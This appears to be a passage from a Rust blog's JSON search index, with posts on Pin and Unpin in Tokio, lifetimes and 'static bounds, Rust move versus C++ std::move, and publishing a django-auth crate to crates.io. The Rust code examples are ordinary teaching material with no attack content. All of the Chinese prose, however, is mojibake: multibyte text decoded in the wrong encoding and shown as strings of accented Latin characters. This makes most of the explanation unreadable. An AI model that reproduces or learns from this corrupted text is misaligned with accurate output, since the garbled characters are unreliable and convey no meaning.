tokio::pinã€‚\nç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 use tokio::pin; async fn my_async_fn() { // async logic here } #[tokio::main] async fn main() { let future = my_async_fn(); // å»æ‰ä¸‹é¢è¿™å¥ï¼Œå°†å¯¼è‡´ç¼–è¯‘å¤±è´¥â€¼ï¸ pin!(future); (\u0026mut future).await; // æˆ–è€…ç”¨æ ‡å‡†åº“çš„ local pin æ–¹æ³•ï¼š // std::pin::pin!(future).await; } å¯¹ stream! / try_stream! å®ç”Ÿæˆçš„ Stream è¿›è¡Œè¿­ä»£æ—¶ å’Œ Future ç±»ä¼¼ï¼Œç”±äº stream! / try_stream! ç”Ÿæˆçš„ Stream åŒæ ·æ˜¯ !Unpin çš„ï¼Œå› æ­¤ï¼Œåœ¨å¯¹å…¶è¿›è¡Œè¿­ä»£æ“ä½œå‰ï¼ŒåŒæ ·éœ€è¦å…ˆ pin ä½ã€‚\nè¯¦ç»†ä¿¡æ¯å¯å‚è€ƒ Streams in Tokioã€‚\n!Unpin å’Œ Pin\u003cBox\u003cT\u003e\u003e ç¤ºä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 use std::marker::PhantomPinned; use std::pin::Pin; #[derive(Debug)] struct Test { a: String, b: *const String, // è¡¨æ˜è¯¥ç±»å‹æœªå®ç° Unpin, å»æ‰è¯¥å­—æ®µåˆ™é»˜è®¤å®ç°äº† Unpin _marker: PhantomPinned, } impl Test { fn new(txt: \u0026str) -\u003e Pin\u003cBox\u003cSelf\u003e\u003e { let t = Test { a: String::from(txt), b: std::ptr::null(), _marker: PhantomPinned, }; let mut boxed = Box::pin(t); let self_ptr: *const String = \u0026boxed.a; unsafe { boxed.as_mut().get_unchecked_mut().b = self_ptr }; boxed } fn a(self: Pin\u003c\u0026Self\u003e) -\u003e \u0026str { \u0026self.get_ref().a } fn b(self: Pin\u003c\u0026Self\u003e) -\u003e \u0026String { unsafe { \u0026*(self.b) } } } pub fn main() { let mut test1 = Test::new(\"test1\"); let test2 = Test::new(\"test2\"); println!(\"a: {}, b: {}\", test1.as_ref().a(), test1.as_ref().b()); println!(\"a: {}, b: {}\", test2.as_ref().a(), test2.as_ref().b()); // ä¸‹é¢è¿™è¡Œç¼–è¯‘æŠ¥é”™â— // ï— cannot borrow data in dereference of `Pin\u003cBox\u003cTest\u003e\u003e` as mutable rustc (E0596) // trait `DerefMut` is required to modify through a dereference, // but it is not implemented for `Pin\u003cBox\u003cTest\u003e\u003e` // test1.a.push_str(\"hello\"); } Unpin å’Œ Pin\u003cBox\u003cT\u003e\u003e ç¤ºä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 use std::pin::Pin; #[derive(Debug)] struct Example { value: i32, } impl Example { fn increment(\u0026mut self) { self.value += 1; } } // Example ç±»å‹è‡ªåŠ¨å®ç°äº† Unpinã€‚ fn main() { let mut example = Example { value: 10 }; let mut pinned_example = Pin::new(\u0026mut example); // ç”±äº Example å®ç°äº† Unpinï¼Œæˆ‘ä»¬å¯ä»¥è·å–å¯å˜å¼•ç”¨æ¥ä¿®æ”¹å®ƒ pinned_example.as_mut().increment(); println!(\"Updated value: {}\", pinned_example.value); } ","description":"","tags":["rust"],"title":"Rust ä¸­çš„ Pin, Unpin å’Œ !Unpin","uri":"/posts/pin-unpin-in-rust/"},{"categories":null,"content":"Lifetime çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ‚¬ç©ºå¼•ç”¨ (dangling references) ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ borrow checker ä¼šæ£€æŸ¥ r çš„ç”Ÿå‘½å‘¨æœŸ 'a æ¯”å…¶å¼•ç”¨çš„æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸ 'b è¦é•¿ï¼Œå› æ­¤ä¼šæ‹’ç»ç¼–è¯‘é€šè¿‡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 // âŒ borrowed value does not live long enough fn main() { let r; // ---------+-- 'a // | { // | let x = 5; // -+-- 'b | r = \u0026x; // | | } // -+ | // | println!(\"r: {}\", r); // | } // ---------+ Lifetime æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³›å‹å‚æ•° å…·ä½“åˆ°å½¢å¼å±‚é¢ï¼ŒLifetime å®é™…ä¸Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³›å‹å‚æ•°ï¼Œè¿™äº›æ³›å‹å‚æ•°ä¸ºç¼–è¯‘å™¨æä¾›äº†æœ‰å…³å¼•ç”¨ä¹‹é—´å¦‚ä½•ç›¸äº’è”ç³»çš„ä¿¡æ¯ã€‚\nå‚è€ƒ common-rust-lifetime-misconceptions ä¸€æ–‡ä¸­çš„å®šä¹‰ï¼Œå¯ä»¥åŠ æ·±å¯¹ Lifetime çš„ç†è§£ï¼š\nğŸŒŸ å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡å®ƒæ‰€æŒ‡å‘çš„æ•°æ®å¯ä»¥è¢«ç¼–è¯‘å™¨é™æ€éªŒè¯åœ¨å…¶å½“å‰å†…å­˜åœ°å€ä¸Šæœ‰æ•ˆçš„æ—¶é—´é•¿åº¦ã€‚\nA variableâ€™s lifetime is how long the data it points to can be statically verified by the compiler to be valid at its current memory address.\nåœ¨å‡½æ•°ä¸­ä½¿ç”¨ Lifetime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 fn longest\u003c'a\u003e(x: \u0026'a str, y: \u0026'a str) -\u003e \u0026'a str { if x.len() \u003e y.len() { x } else { y } } fn main() { let string1 = String::from(\"long string is long\"); { let string2 = String::from(\"xyz\"); let result = longest(string1.as_str(), string2.as_str()); println!(\"The longest string is: {}\", result); } } ä¸Šä¾‹ä¸­ï¼Œç”±äº borrow checker æ— æ³•æ¨æ–­å‡º xã€y çš„ç”Ÿå‘½å‘¨æœŸå’Œè¿”å›å€¼çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼Œå› æ­¤å¿…é¡»é€šè¿‡ç”Ÿå‘½å‘¨æœŸå‚æ•°æ¥æŒ‡å®šã€‚è¯¥ä¾‹ä¸­ï¼Œè¿”å›å€¼çš„ç”Ÿå‘½å‘¨æœŸå’Œä¸¤ä¸ªå˜é‡ä¸­ç”Ÿå‘½å‘¨æœŸè¾ƒçŸ­çš„é‚£ä¸ªä¿æŒä¸€è‡´ã€‚\nç”Ÿå‘½å‘¨æœŸæ³¨è§£å¹¶ä¸å½±å“å¼•ç”¨çš„ç”Ÿå­˜æ—¶é—´ï¼Œè€Œæ˜¯ç”¨äºæè¿°å¤šä¸ªå¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼ˆä¸»è¦æ˜¯æè¿°è¿”å›å€¼å’Œå…¥å‚çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼‰ã€‚ åœ¨ç»“æ„ä½“ä¸­ä½¿ç”¨ Lifetime 1 2 3 4 5 6 7 8 9 10 11 struct ImportantExcerpt\u003c'a\u003e { part: \u0026'a str, } fn main() { let novel = String::from(\"Call me Ishmael. Some years ago...\"); let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\"); let i = ImportantExcerpt { part: first_sentence, }; } ä¸Šä¾‹ä¸­ï¼Œ ImportantExcerpt å®ä¾‹çš„ç”Ÿå‘½å‘¨æœŸä¸èƒ½è¶…å‡ºå…¶ part å­—æ®µçš„ç”Ÿå‘½å‘¨æœŸã€‚\nLifetime å‚æ•°çš„çœç•¥è§„åˆ™ (Lifetime elision rules) å¯¹äºä¸€ä¸ªå‡½æ•°æ¥è¯´ï¼š\nç¼–è¯‘å™¨ä¸ºæ¯ä¸ªå¼•ç”¨å‚æ•°åˆ†é…ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚ å¦‚æœåªæœ‰ä¸€ä¸ªè¾“å…¥ç”Ÿå‘½å‘¨æœŸå‚æ•°ï¼Œåˆ™å°†è¯¥ç”Ÿå‘½å‘¨æœŸåˆ†é…ç»™æ‰€æœ‰çš„è¾“å‡ºç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚ å¦‚æœæœ‰å¤šä¸ªè¾“å…¥ç”Ÿå‘½å‘¨æœŸå‚æ•°ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªæ˜¯ \u0026self æˆ– \u0026mut self (å³è¿™æ˜¯ä¸€ä¸ªæ–¹æ³•)ï¼Œåˆ™å°† self çš„ç”Ÿå‘½å‘¨æœŸåˆ†é…ç»™æ‰€æœ‰çš„è¾“å‡ºç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚ å½“å¼•ç”¨æ²¡æœ‰æ˜¾å¼ç”Ÿå‘½å‘¨æœŸæ³¨è§£æ—¶ï¼Œç¼–è¯‘å™¨æŒ‰ç…§ä¸Šè¿°è§„åˆ™æ¥è®¡ç®—å¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸã€‚å¦‚æœä¸Šè¿°ä¸‰æ¡è§„åˆ™èµ°åˆ°åº•ï¼Œä»ç„¶å­˜åœ¨æ— æ³•è®¡ç®—å‡ºç”Ÿå‘½å‘¨æœŸçš„å¼•ç”¨æ—¶ï¼Œç¼–è¯‘å™¨ä¼šåœæ­¢å¹¶æŠ¥é”™ã€‚\nç†è§£ \u0026'static T å¼•ç”¨ è¯·æ³¨æ„ \u0026'static T å’Œ T: â€˜static äºŒè€…ä¹‹é—´çš„åŒºåˆ«ã€‚\n\u0026'static T å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼äº§ç”Ÿï¼š\nå¯¹é™æ€å˜é‡çš„å¼•ç”¨\nä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²å­—é¢é‡å› ä¸ºå­˜å‚¨åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨ç¨‹åºè¿è¡ŒæœŸé—´éƒ½æœ‰æ•ˆï¼Œå› æ­¤å…·æœ‰ 'static ç”Ÿå‘½å‘¨æœŸã€‚ä¾‹å¦‚ï¼š\n1 2 3 fn main() { let str_literal: \u0026'static str = \"å­—ç¬¦ä¸²å­—é¢é‡\"; } é€šè¿‡ Box::leak æ–¹æ³•åœ¨è¿è¡Œæ—¶ç”Ÿæˆä¸€ä¸ª \u0026'static T, ä¸‹é¢å°†å±•å¼€è®ºè¿°ã€‚\né€šè¿‡ Box::leak ç”Ÿæˆ \u0026'static T å¼•ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #[derive(Debug)] struct A { s: String, } impl Drop for A { fn drop(\u0026mut self) { println!(\"{:?} has been dropped!\", self); } } fn leak_a() -\u003e \u0026'static A { let a = A { s: \"hello\".to_string(), }; Box::leak(a.into()) } fn main() { let a: \u0026'static A = leak_a(); println!(\"a = {:?}\", a); // recover `a` Box from the leaked reference let a = unsafe { let const_ptr = a as *const A; let mut_ptr = const_ptr as *mut A; Box::from_raw(mut_ptr) }; println!(\"a = {:?}\", a); // `a` will be dropped here } 1 2 3 a = A { s: \"hello\" } a = A { s: \"hello\" } A { s: \"hello\" } has been dropped! ä¸Šé¢è¿™ä¸ªä¾‹å­æœ‰ä¸¤ä¸ªè¦ç‚¹ï¼š\né€šè¿‡ Box::leak ç”Ÿæˆ \u0026'static T å¼•ç”¨ é€šè¿‡ Box::from_raw å°†å¼•ç”¨æ¢å¤ä¸ºä¸€ä¸ª Box å¯¹è±¡ï¼ˆéœ€ç»“åˆ unsafe ä»£ç ï¼‰ å…³äºè¿™ä¸ªä¸»é¢˜çš„è¿›ä¸€æ­¥çš„è®¨è®ºï¼Œå¯ä»¥å‚è€ƒæˆ‘ç»™ rust-blog æçš„ä¸€ä¸ª PRã€‚\nåœ¨æ³›å‹ä¸­ä½¿ç”¨ Lifetime ç†è§£ T: 'static è¯·æ³¨æ„å’Œ \u0026â€˜static T å¼•ç”¨ ä¹‹é—´çš„åŒºåˆ«ã€‚\nä¸‹é¢çš„è¯»æ³•æœ‰åŠ©äºæ­£ç¡®ç†è§£ T: 'static:\nğŸŒŸ T: 'static åº”è¯»ä½œï¼š T å—åˆ° 'static ç±»å‹ç”Ÿå‘½å‘¨æœŸçš„çº¦æŸã€‚\nT: 'static:\nåŒ…æ‹¬æ‰€æœ‰çš„ \u0026'static T ä¹ŸåŒ…æ‹¬æ‰€æœ‰çš„ owned types, å› ä¸º owner å¯ä»¥ç¡®ä¿æ•°æ®ä¸€ç›´æœ‰æ•ˆã€‚å› æ­¤ T: 'static ï¼š å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ†é… ä¸éœ€è¦åœ¨æ•´ä¸ªç¨‹åºç”Ÿå‘½å‘¨æœŸå†…æœ‰æ•ˆ å¯ä»¥å®‰å…¨ã€è‡ªç”±åœ°ä¿®æ”¹ å¯ä»¥åœ¨è¿è¡Œæ—¶è¢«é‡Šæ”¾ å¯ä»¥æœ‰ä¸åŒæŒç»­æ—¶é—´çš„ç”Ÿå‘½å‘¨æœŸ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 fn drop_static\u003cT: 'static\u003e(t: T) { std::mem::drop(t); } fn main() { let mut strings: Vec\u003cString\u003e = Vec::new(); for i in 0..10 { strings.push(i.to_string()); } // strings are owned types so they're bounded by 'static for mut string in strings { // all the strings are mutable string.push_str(\"a mutation\"); // all the strings are droppable drop_static(string); // âœ… } } ç†è§£ \u0026'a T å’Œ T: 'a \u0026'a T éšå«äº† T: 'a\nå¦‚æœä¸€ä¸ª T çš„å¼•ç”¨åœ¨ 'a å†…æœ‰æ•ˆï¼Œé‚£ä¹ˆ T åœ¨è¿™ä¸ªå‘¨æœŸå†…ä¹Ÿå¿…é¡»æœ‰æ•ˆï¼Œå¦åˆ™å‰è€…ä¸æˆç«‹ã€‚\nT:'a æ¯” \u0026'a T æ›´åŠ é€šç”¨å’Œçµæ´»\nå‰è€…å¯ä»¥æ¥å— owned types (æŒ‡éå¼•ç”¨ç±»å‹) å’Œå¼•ç”¨\nåè€…åªèƒ½æ¥å—å¼•ç”¨\nå¦‚æœ T: 'static, é‚£ä¹ˆ T: 'a, å› ä¸ºï¼š\nå‰è€…è¯»ä½œï¼šT æ»¡è¶³é™æ€ç”Ÿå‘½å‘¨æœŸçº¦æŸ\nåè€…è¯»ä½œï¼šT æ»¡è¶³ 'a ç”Ÿå‘½å‘¨æœŸçº¦æŸ\né™æ€ç”Ÿå‘½å‘¨æœŸ \u003e= 'a ç”Ÿå‘½å‘¨æœŸï¼Œå› æ­¤ä¸Šè¿°ç»“è®ºæˆç«‹\næ¡ˆä¾‹ï¼ˆå‚è€ƒè‡ªcommon-rust-lifetime-misconceptions)ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // only takes ref types bounded by 'a fn t_ref\u003c'a, T: 'a\u003e(t: \u0026'a T) {} // takes any types bounded by 'a fn t_bound\u003c'a, T: 'a\u003e(t: T) {} // owned type which contains a reference struct Ref\u003c'a, T: 'a\u003e(\u0026'a T); fn main() { let string = String::from(\"string\"); t_bound(\u0026string); // âœ… t_bound(Ref(\u0026string)); // âœ… t_bound(\u0026Ref(\u0026string)); // âœ… t_ref(\u0026string); // âœ… t_ref(Ref(\u0026string)); // âŒ - expected ref, found struct t_ref(\u0026Ref(\u0026string)); // âœ… // string var is bounded by 'static which is bounded by 'a t_bound(string); // âœ… } ","description":"","tags":["rust"],"title":"ç†è§£ Rust çš„ ç”Ÿå‘½å‘¨æœŸ (Lifetime)","uri":"/posts/understanding-lifetimes-in-rust/"},{"categories":null,"content":"Rust çš„ move å’Œ C++ çš„ std::move åœ¨è¡¨é¢ä¸Šçœ‹æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ¶‰åŠåˆ°æ•°æ®æˆ–èµ„æºçš„è½¬ç§»ã€‚ç„¶è€Œï¼Œå®ƒä»¬åœ¨è®¾è®¡ç†å¿µã€å®ç°æ–¹å¼ä»¥åŠå®ƒä»¬åœ¨å„è‡ªè¯­è¨€ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²ä¸Šæœ‰ç€æ ¹æœ¬çš„åŒºåˆ«ã€‚\nRust ä¸­çš„ Move è¯­ä¹‰ æ‰€æœ‰æƒè½¬ç§» Rust ä¸­çš„ move è¯­ä¹‰æ˜¯å…¶æ‰€æœ‰æƒç³»ç»Ÿçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å½“ä¸€ä¸ªå€¼ä»ä¸€ä¸ªå˜é‡ç§»åŠ¨åˆ°å¦ä¸€ä¸ªå˜é‡æ—¶ï¼ŒåŸå§‹å˜é‡ä¸å†æœ‰æƒè®¿é—®è¯¥å€¼ã€‚è¿™é¿å…äº†æ‚¬å‚æŒ‡é’ˆå’Œæ•°æ®ç«äº‰ç­‰é—®é¢˜ã€‚ ç¼–è¯‘æ—¶æ£€æŸ¥ Rust çš„ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶å°±ä¼šæ£€æŸ¥æ‰€æœ‰æƒã€å€Ÿç”¨å’Œç”Ÿå‘½å‘¨æœŸè§„åˆ™ï¼Œç¡®ä¿å†…å­˜å®‰å…¨è€Œæ— éœ€è¿è¡Œæ—¶å¼€é”€ã€‚ è‡ªåŠ¨æ§åˆ¶ Rust çš„ move è¯­ä¹‰æ˜¯é€šè¿‡ç¼–è¯‘å™¨è‡ªåŠ¨å®ç°çš„ï¼Œä¸éœ€è¦ç¨‹åºå‘˜æä¾›ç‰¹æ®Šçš„ä»£ç æ¥æ”¯æŒ move è¯­ä¹‰ã€‚ C++ ä¸­çš„ Move è¯­ä¹‰ èµ„æºè½¬ç§» C++11 å¼•å…¥äº† move è¯­ä¹‰ï¼Œä¸»è¦ç”¨äºä¼˜åŒ–èµ„æºç®¡ç†ï¼Œå‡å°‘ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶ã€‚é€šè¿‡ std::move ï¼Œå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€æˆ–èµ„æºè½¬ç§»åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼ŒåŸå¯¹è±¡åˆ™å¤„äºä¸€ä¸ªæœ‰æ•ˆä½†æœªå®šä¹‰çš„çŠ¶æ€ã€‚ æ ‡å‡†åº“çš„æ”¯æŒ C++ çš„ move è¯­ä¹‰ä¸å…¶æ ‡å‡†åº“ç´§å¯†ç»“åˆï¼Œè®¸å¤šå®¹å™¨å’Œç®—æ³•éƒ½å¯¹ move è¯­ä¹‰è¿›è¡Œäº†ä¼˜åŒ–ã€‚ æ‰‹åŠ¨æ§åˆ¶ ä¸ Rust çš„è‡ªåŠ¨å’Œä¸¥æ ¼çš„æ‰€æœ‰æƒæ¨¡å‹ä¸åŒï¼ŒC++ ç¨‹åºå‘˜éœ€è¦æ›´å¤šåœ°æ‰‹åŠ¨ç®¡ç†èµ„æºå’Œä½¿ç”¨ move è¯­ä¹‰ï¼Œè¿™æä¾›äº†çµæ´»æ€§ä½†ä¹Ÿå¢åŠ äº†é”™è¯¯çš„å¯èƒ½æ€§ã€‚ å…·ä½“æ¥è®²ï¼ŒC++ çš„ move è¯­ä¹‰æ˜¯é€šè¿‡ç±»çš„ã€ç§»åŠ¨æ„é€ å‡½æ•°ã€å’Œã€ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€æ¥æä¾›æ”¯æŒçš„ã€‚\nå¼‚åŒç‚¹åˆ†æ è®¾è®¡ç†å¿µ Rust çš„ move è¯­ä¹‰è®¾è®¡ä¸»è¦æ˜¯ä¸ºäº†å®ç°å†…å­˜å®‰å…¨å’Œçº¿ç¨‹å®‰å…¨ï¼Œè€Œ C++ çš„ move è¯­ä¹‰æ›´å¤šæ˜¯ä¸ºäº†æ€§èƒ½ä¼˜åŒ–å’Œèµ„æºç®¡ç†ã€‚ å®ç°æœºåˆ¶ Rust åœ¨ç¼–è¯‘æ—¶å¼ºåˆ¶æ‰§è¡Œæ‰€æœ‰æƒè§„åˆ™ï¼Œå‡ ä¹ä¸å…è®¸è¿åè¿™äº›è§„åˆ™çš„ä»£ç é€šè¿‡ç¼–è¯‘ã€‚è€Œ C++ ç»™äº†ç¨‹åºå‘˜æ›´å¤šçš„æ§åˆ¶æƒï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€æ›´é«˜çš„å‡ºé”™é£é™©ã€‚ ä½¿ç”¨åœºæ™¯ Rust çš„ move ç”¨äºæ‰€æœ‰æƒè½¬ç§»ï¼Œå¼ºè°ƒå®‰å…¨å’Œæ¸…æ™°çš„æ‰€æœ‰æƒæ¨¡å‹ã€‚C++ çš„ move æ›´å¤šæ˜¯ç”¨äºæ€§èƒ½ä¼˜åŒ–ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§å‹å¯¹è±¡æˆ–èµ„æºå¯†é›†å‹å¯¹è±¡æ—¶ã€‚ æ·±å…¥åˆ°å†…å­˜å±‚é¢ å¦‚æœæˆ‘ä»¬æ·±å…¥åˆ°å†…å­˜å±‚é¢ï¼Œå°±ä¼šå‘ç°ï¼ŒRust çš„ move å’Œ C++ çš„ move åˆæœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ã€‚\nå°±å†…å­˜æ“ä½œè€Œè¨€ï¼ŒRust ä¸­çš„ move è¿‡ç¨‹æœ¬è´¨ä¸Šæ˜¯å¯¹æ•°æ®ç»“æ„çš„æµ…æ‹·è´1ï¼ˆå³æŒ‰å­—èŠ‚æ‹·è´ï¼‰ã€‚ä»¥ Vec\u003cT\u003e ä¸ºä¾‹ï¼Œmove æ“ä½œæ¶‰åŠåˆ°çš„åªæ˜¯å¯¹æ•°æ®ç»“æ„å†…éƒ¨å­—æ®µï¼ˆæŒ‡é’ˆã€é•¿åº¦å’Œå®¹é‡ç­‰ï¼‰çš„æ‹·è´ï¼Œè€Œä¸ä¼šè§¦åŠå †ä¸Šçš„æ•°æ®æœ¬èº«ã€‚è¿™ç‚¹å’Œ C++ çš„ã€ç§»åŠ¨æ„é€ å‡½æ•°ã€çš„å®ç°å¾ˆç›¸ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼š\nC++ åœ¨æµ…æ‹·è´ä¹‹åï¼Œéœ€è¦å°†åŸå§‹å¯¹è±¡çš„å­—æ®µé‡ç½®ï¼Œä»¥é˜²æ­¢ææ„å‡½æ•°å¤šæ¬¡é‡Šæ”¾èµ„æºã€‚ Rust åˆ™ç›´æ¥é€šè¿‡ç¼–è¯‘å™¨ä¿è¯åŸå§‹å¯¹è±¡ä¸å†å¯ç”¨ï¼Œåœ¨å®‰å…¨æ€§ä¸Šæ›´èƒœä¸€ç­¹ã€‚ å½“ç„¶ï¼Œå¦‚å‰æ‰€è¿°ï¼Œæ•´ä¸ªè¿‡ç¨‹ Rust æ˜¯è‡ªåŠ¨å®Œæˆçš„ï¼Œè€Œ C++ éœ€è¦ç”±ç¨‹åºå‘˜æ¥æ‰‹å·¥å®Œæˆã€‚\næ€»ç»“ ç»¼ä¸Šæ‰€è¿°ï¼ŒRust çš„ move å’Œ C++ çš„ move åœ¨è®¾è®¡ç†å¿µã€å®ç°æœºåˆ¶å’Œä½¿ç”¨åœºæ™¯æ–¹é¢éƒ½å­˜åœ¨è¾ƒå¤§å·®å¼‚ï¼Œä½†ä¸¤è€…åœ¨èµ„æºè½¬ç§»æ–¹é¢åˆæœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œä¾‹å¦‚éƒ½å¯ä»¥é€šè¿‡æµ…æ‹·è´æ¥å®Œæˆèµ„æºçš„é«˜æ•ˆè½¬ç§»ã€‚é€šè¿‡è¿™ç§å¯¹æ¯”åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ›´è¿›ä¸€æ­¥ç†è§£ move è¿™ä¸ªæ¦‚å¿µã€‚\nè¿™ç‚¹å¯ä»¥é€šè¿‡ç”Ÿæˆ Rust æºç çš„ LLVM IR æ¥éªŒè¯ï¼ˆå‘½ä»¤ï¼š cargo rustc -- --emit=llvm-ir ï¼‰ï¼Œä¾‹å¦‚è¿™ä¸ªæ¡ˆä¾‹ã€‚Â â†©ï¸\n","description":"","tags":["rust"],"title":"Rust çš„ move å’Œ C++ çš„ std::move","uri":"/posts/move-in-rust-and-cpp/"},{"categories":null,"content":"ä»Šå¤©å‘å¸ƒäº†æˆ‘çš„ç¬¬ä¸€ä¸ª crate: django-auth, è™½ç„¶æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ crate, ä½†éº»é›€è™½å°ï¼Œäº”è„ä¿±å…¨ï¼ŒAPI æ–‡æ¡£ã€æµ‹è¯•ç”¨ä¾‹ã€doc test ç­‰ä¸€ä¸ªéƒ½ä¸èƒ½å°‘ ğŸ˜ã€‚\nå…ˆç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸ªåº“ï¼Œç„¶åå†ä»‹ç»ä¸€ä¸‹åœ¨ crates.io ä¸Šå‘å¸ƒ crate çš„æµç¨‹ã€‚\ndjango-auth Django æ˜¯ä¸€ä¸ª Python çš„ web framework, è‹¥å¹²å¹´å‰ç”¨æ›¾ç» Django å†™è¿‡ä¸€äº› Web åº”ç”¨ã€‚æœ€è¿‘åˆšå¥½åœ¨å­¦ä¹  Rust, å› æ­¤è®¡åˆ’ç”¨ Rust å°†å…¶ä¸­ä¸€ä¸ªåº”ç”¨é‡å†™ä¸€éç»ƒç»ƒæ‰‹ã€‚\né¦–å…ˆé‡åˆ°çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¾¿æ˜¯è´¦å·é‰´æƒçš„é—®é¢˜ï¼š\næ—§çš„åº”ç”¨ä½¿ç”¨çš„æ˜¯ Django çš„ auth ä½“ç³»ï¼Œæ•°æ®åº“ä¸­ä¿å­˜çš„å¯†ç  hash å€¼ç”± Django æ¡†æ¶è‡ªåŠ¨ç”Ÿæˆï¼› å¦‚æœä¸å¸Œæœ›è®©æ‰€æœ‰ç”¨æˆ·é‡ç½®å¯†ç ï¼ˆè¿™æ ·åšä¼šå¯¼è‡´æ‰€æœ‰ç”¨æˆ·çš„æ—§å¯†ç å¤±æ•ˆï¼‰ï¼Œå°±éœ€è¦åœ¨æ–°å†™çš„ Rust åº”ç”¨ä¸­å…¼å®¹ Django çš„ auth ä½“ç³»ï¼› è¦æƒ³å…¼å®¹ Django çš„ auth ä½“ç³»ï¼Œå°±éœ€è¦å°† Django ç”Ÿæˆçš„ auth æ•°æ®åº“è¡¨è¿ç§»å‡ºæ¥ï¼Œå¹¶ä¸”èƒ½å¤Ÿåˆ©ç”¨è¿™äº›æ•°æ®æ¥éªŒè¯ç”¨æˆ·å¯†ç ã€‚ ç»è¿‡ä¸Šé¢è¿™ä¹ˆä¸€ç•ªåˆ†æï¼Œç›¸ä¿¡ä½ åº”è¯¥çŸ¥é“è¿™ä¸ª crate æ˜¯å¹²ä»€ä¹ˆçš„äº†ã€‚ä¸»è¦å°±ä¸¤ä¸ªåŠŸèƒ½ï¼š\néªŒè¯ç”¨æˆ·è¾“å…¥çš„å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå¯¹åº” APIï¼š django_auth ä¸ºæ–°ç”¨æˆ·ï¼ˆæˆ–è€…å½“ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ï¼‰ï¼Œç”Ÿæˆ Django é£æ ¼çš„ hashed password, å¯¹åº” API: django_encode_password ğŸŒŸ å¦‚æœå¯¹ Django çš„å¯†ç å­˜å‚¨æ ¼å¼æ„Ÿå…´è¶£ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡æ¡£ï¼šPassword management in Django ã€‚\né™¤äº†å¯ä»¥ä½œä¸º lib ä½¿ç”¨å¤–ï¼Œè¿˜é™„èµ äº†ä¸€ä¸ª cli å·¥å…·ï¼Œç”¨æ¥éªŒè¯å¯†ç ã€å¯¹å¯†ç è¿›è¡Œç¼–ç ï¼š\n$ cargo run --example auth:\n1 2 3 4 5 6 7 8 9 10 11 12 Authenticate or generate Django-managed passwords Usage: auth \u003cCOMMAND\u003e Commands: encode Encode a password in Django-style verify Verify a Django stored hashed password help Print this message or the help of the given subcommand(s) Options: -h, --help Print help -V, --version Print version ğŸš€ å°±è¿™ä¹ˆç®€å•ï¼\nCrate å‘å¸ƒæµç¨‹ åˆ›å»º crate.io è´¦å·\næ‰“å¼€ç½‘ç«™ crate.ioï¼Œç‚¹å‡»å³ä¸Šè§’ç™»å½• crate.ioã€‚éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š\nç›®å‰åªæ”¯æŒ github è´¦å·ç™»å½•ã€‚ ç”¨äºç™»å½•çš„ github è´¦å·ä¼¼ä¹è¦å…ˆæ‹¥æœ‰ä¸€ä¸ª Organizationï¼ˆæˆ‘å› ä¸ºä¹‹å‰å·²ç»æœ‰ Organizationï¼Œæ‰€ä»¥ä¸ç¡®å®šæ²¡æœ‰è¡Œä¸è¡Œï¼‰ã€‚ è·å– API token\næ‰“å¼€ API Token é¡µé¢ï¼ŒæŒ‰ç…§æŒ‡ç¤ºç”Ÿæˆä¸€ä¸ª API token, å¤åˆ¶ token, ç„¶ååˆ°å‘½ä»¤è¡Œè¿è¡Œï¼š\n1 cargo login æŒ‰ç…§æç¤ºå°† token 